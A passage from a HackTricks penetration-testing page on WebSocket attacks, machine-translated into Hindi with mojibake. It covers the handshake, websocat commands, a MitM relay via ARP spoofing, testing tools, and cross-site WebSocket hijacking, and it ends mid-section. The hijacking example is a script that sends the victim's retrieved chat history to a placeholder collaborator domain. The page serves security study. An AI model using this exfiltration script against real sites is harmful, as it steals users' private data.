# WebSocket рд╣рдорд▓реЗ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## WebSockets рдХреНрдпрд╛ рд╣реИрдВ

WebSocket рдХрдиреЗрдХреНрд╢рди **HTTP** рд╣реИрдВрдбрд╢реЗрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВ рдФрд░ **рд▓реЙрдиреНрдЧ-рд▓рд╛рдЗрд╡реНрдб** рдбрд┐рдЬрд╝рд╛рдЗрди рдХреА рдЧрдИ рд╣реИрдВ, рдЬреЛ рдХрд┐рд╕реА рднреА рд╕рдордп рдмрд┐рдирд╛ рд╕реМрджрд╛ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рджреЛрдиреЛрдВ рджрд┐рд╢рд╛рдУрдВ рдореЗрдВ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред рдЗрд╕рд╕реЗ WebSockets рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **рдХрдо рд▓реИрдЯреЗрдВрд╕реА рдпрд╛ рд╕рд░реНрд╡рд░-рдкреНрд░реЗрд░рд┐рдд рд╕рдВрдЪрд╛рд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рдлрд╛рдпрджреЗрдордВрдж рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд▓рд╛рдЗрд╡ рд╡рд┐рддреНрддреАрдп рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдоред

### WebSocket рдХрдиреЗрдХреНрд╢рди рдХреА рд╕реНрдерд╛рдкрдирд╛

WebSocket рдХрдиреЗрдХреНрд╢рди рдХреА рд╕реНрдерд╛рдкрдирд╛ рдкрд░ рдПрдХ рд╡рд┐рд╕реНрддреГрдд рд╡реНрдпрд╛рдЦреНрдпрд╛ [**рдпрд╣рд╛рдБ**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рд╕рд╛рд░рд╛рдВрд╢ рдореЗрдВ, WebSocket рдХрдиреЗрдХреНрд╢рди рдЖрдо рддреМрд░ рдкрд░ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдП рдЧрдП рддрд░реАрдХреЗ рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
```
`wss` рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдПрдХ **TLS** рд╕реБрд░рдХреНрд╖рд┐рдд WebSocket рдХрдиреЗрдХреНрд╢рди рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ `ws` рдПрдХ **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд** рдХрдиреЗрдХреНрд╢рди рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред

рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рджреМрд░рд╛рди, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ рд╣реИрдВрдбрд╢реЗрдХ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рд╣реИрдВрдбрд╢реЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:

рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХ рд╣реИрдВрдбрд╢реЗрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ:
```
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
рд╕рд░реНрд╡рд░ рдХрд╛ рд╣реИрдВрдбрд╢реЗрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
**WebSocket рд╣реИрдВрдбрд╢реЗрдХ рдХреЗ рдореБрдЦреНрдп рдмрд┐рдВрджреБ:**

- `Connection` рдФрд░ `Upgrade` рд╣реЗрдбрд░реНрд╕ WebSocket рд╣реИрдВрдбрд╢реЗрдХ рдХреА рд╢реБрд░реБрдЖрдд рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреЗ рд╣реИрдВред
- `Sec-WebSocket-Version` рд╣реЗрдбрд░ рд╡рд╛рдВрдЫрд┐рдд WebSocket рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рдЖрдо рддреМрд░ рдкрд░ `13`ред
- `Sec-WebSocket-Key` рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ Base64-рдПрдиреНрдХреЛрдбреЗрдб рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдорд╛рди рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рд╣реИрдВрдбрд╢реЗрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдХреИрд╢рд┐рдВрдЧ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд╕рд╛рде рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЛ рд░реЛрдХрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдорд╛рди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ рдмрд▓реНрдХрд┐ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдХрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд┐рд╕реА рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рд░реНрд╡рд░ рдпрд╛ рдХреИрд╢ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдирд╣реАрдВ рд╣реИред
- рд╕рд░реНрд╡рд░ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ `Sec-WebSocket-Accept` рд╣реЗрдбрд░ `Sec-WebSocket-Key` рдХрд╛ рд╣реИрд╢ рд╣реИ, рдЬреЛ рд╕рд░реНрд╡рд░ рдХреА рдЗрдЪреНрдЫрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рдПрдХ WebSocket рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИред

рдпреЗ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреА рд╣реИрдВ рдХрд┐ рд╣реИрдВрдбрд╢реЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдФрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╣реИ, рдЬреЛ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдкрд░ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдорд╛рд░реНрдЧ рдЦреЛрд▓рддреА рд╣реИред
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
рдпрд╛ рдПрдХ рд╡реЗрдмрд╕реЛрдХреЗрдЯ рд╕рд░реНрд╡рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

рдпрджрд┐ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдЧреНрд░рд╛рд╣рдХ рдЖрдкрдХреЗ рд╡рд░реНрддрдорд╛рди рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ **HTTP websocket** рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реИрдВ, рддреЛ рдЖрдк [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЧреНрд░рд╛рд╣рдХ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ MitM рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдПрдХ рдмрд╛рд░ рдЬрдм рдЧреНрд░рд╛рд╣рдХ рдЖрдкрд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕ рдЬрд╛рдВрдЪ

рдЖрдк **рдЯреВрд▓** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕ рдореЗрдВ рдЬреНрдЮрд╛рдд** **рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдЦреЛрдЬ, рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ рдФрд░ рдЦреЛрдЬ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдбреАрдмрдЧ рдЯреВрд▓реНрд╕

* **Burp Suite** рдирд┐рдпрдорд┐рдд HTTP рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ рд╣реА рдХрд░рддрд╛ рд╣реИ, рдЙрд╕реА рддрд░рд╣ рд╕реЗ MitM рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрдЪрд╛рд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдЖрдкрдХреЛ **рдЗрддрд┐рд╣рд╛рд╕** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ, **рдЕрдВрдмреБрд╖рдг рдирд┐рдпрдо** рд╕реЗрдЯ рдХрд░рдиреЗ, **рдореИрдЪ рдФрд░ рдкреБрдирдГ рд╕реНрдерд╛рдкрд┐рдд рдирд┐рдпрдо** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ, **Intruder** рдФрд░ **AutoRepeater** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Burp рдореЗрдВ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрдЪрд╛рд░ рдХреЛ рдмреЗрд╣рддрд░ рдврдВрдЧ рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рджреЗрдЧрд╛ред
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**" рдХреЗ рд▓рд┐рдП рдЫреЛрдЯрд╛, рдпрд╣ рдЯреВрд▓, рдиреЛрдб.рдЬреЗрдПрд╕ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╕рднреА рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдФрд░ рд╕реЙрдХреЗрдЯ.рдЖрдИрдУ рд╕рдВрдЪрд╛рд░реЛрдВ рдХреЛ **рдХреИрдкреНрдЪрд░, рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ, рдХрд╕реНрдЯрдо рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдВ** рдФрд░ рджреЗрдЦ рд╕рдХреЗред
* [**wsrepl**](https://github.com/doyensec/wsrepl) рдПрдХ **рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╡реЗрдмрд╕реЙрдХреЗрдЯ REPL** рд╣реИ рдЬреЛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдкреНрд░рд╡реЗрд╢рди рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ **рдЖрдЧрдВрддреБрдХ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЕрд╡рд▓реЛрдХрди рдХрд░рдиреЗ рдФрд░ рдирдП рднреЗрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕ рд╕рдВрдЪрд╛рд░ рдХреЛ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд░рд▓ рдлреНрд░реЗрдорд╡рд░реНрдХ рд╣реИред&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) рдпрд╣ рдПрдХ **рд╡реЗрдм рд╣реИ** рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╡реЗрдмреНрд╕ рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрдЪрд╛рд░/рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдХреЗ рдмреАрдЪ, рдпрд╣ рдПрдХ **рд╡реЗрдм рд╣реИ** рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╡реЗрдмреНрд╕ рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд▓реИрдм

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдХреЛрдб рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдмрд╕реЙрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡реЗрдм рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) рдореЗрдВ рдЖрдк рдПрдХ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ (CSWSH)

**рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**, рдЬрд┐рд╕реЗ **рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ** рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, **[рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдлреЙрд░реНрдЬрд░реА (CSRF)](csrf-cross-site-request-forgery.md)** рдХрд╛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓рд╛ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╣реИрдВрдбрд╢реЗрдХ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХрдордЬреЛрд░реА рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╣реИрдВрдбрд╢реЗрдХ рдХреЗрд╡рд▓ **HTTP рдХреБрдХреА** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╣реЛрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ **CSRF рдЯреЛрдХрди** рдпрд╛ рд╕рдорд╛рди рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗред

рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдХреБрдХрд░реНрдо рд╡реЗрдм рдкреГрд╖реНрда** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдПрдХ рдХрдордЬреЛрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдЖрд░рдВрдн рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдпрд╣ рдХрдиреЗрдХреНрд╢рди рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рд╕рддреНрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд╣реЛрддрд╛ рд╣реИ, рд╕рддреНрд░ рдкреНрд░рдмрдВрдзрди рддрдВрддреНрд░ рдореЗрдВ CSRF рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдХрдореА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддрд╛ рд╣реИред

### рд╕рд░рд▓ рд╣рдорд▓рд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рд╡реЗрдмрд╕реЙрдХреЗрдЯ** рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╕рдордп **рдХреБрдХреА** рд╕рд░реНрд╡рд░ рдХреЛ **рднреЗрдЬреА** рдЬрд╛рддреА рд╣реИред **рд╕рд░реНрд╡рд░** рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ **рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕рдХреЗ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рддреНрд░ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд░ рд╕рдХреЗ**ред

рдлрд┐рд░, рдпрджрд┐ **рдЙрджрд╛рд╣рд░рдг** рдХреЗ рд▓рд┐рдП **рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рд░реНрд╡рд░** рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдмрд╛рддрдЪреАрдд рдХрд╛ рдЗрддрд┐рд╣рд╛рд╕ рд╡рд╛рдкрд╕ рднреЗрдЬрддрд╛ рд╣реИ рдЕрдЧрд░ рдПрдХ рд╕рдВрджреЗрд╢ рдХреЗ рд╕рд╛рде "**READY"** рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ **рд╕рд░рд▓ XSS** рдЬреЛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ (рдХреБрдХреА рд╡рд┐рдХреНрдЯрд┐рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдзрд┐рдХреГрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рднреЗрдЬреА рдЬрд╛рдПрдЧреА**) "**READY**" рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж рдмрд╛рддрдЪреАрдд рдХрд╛ рдЗрддрд┐рд╣рд╛рд╕ **рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХреЗрдЧрд╛ред
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдиреЗ **рдбреЛрдореЗрди рдХреЗ рдПрдХ рдЙрдк-рдбреЛрдореЗрди рдореЗрдВ рдЕрдирд┐рдпрдорд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ** рдХреА рдкреНрд░рдмрдВрдзрди рдХреАред рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **рдЙрдк-рдбреЛрдореЗрди** рдерд╛, рдЗрд╕рд▓рд┐рдП **рдХреБрдХреА** рднреЗрдЬреА рдЬрд╛ рд░рд╣реА рдереА, рдФрд░ рдХреНрдпреЛрдВрдХрд┐ **Websocket рдиреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреА рдЙрддреНрдкрддреНрддрд┐ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдирд╣реАрдВ рдХреА рдереА**, рдЗрд╕рд╕реЗ рдЗрд╕рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛ рдФрд░ рдЗрд╕рд╕реЗ **рдЯреЛрдХрди рдЪреБрд░рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛**ред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдбреЗрдЯрд╛ рдЪреБрд░рд╛рдирд╛

рдЙрд╕ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкреНрд░рддрд┐рд░реВрдкрдг рдХрд░рдирд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП .html рдлрд╝рд╛рдЗрд▓реЗрдВ) рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдЕрдВрджрд░ рдЬрд╣рд╛рдВ рд╡реЗрдмрд╕реЙрдХреЗрдЯ рд╕рдВрдЪрд╛рд░ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЙрд╕рдореЗрдВ рдЗрд╕ рдХреЛрдб рдХреЛ рдЬреЛрдбрд╝реЗрдВ:
```javascript
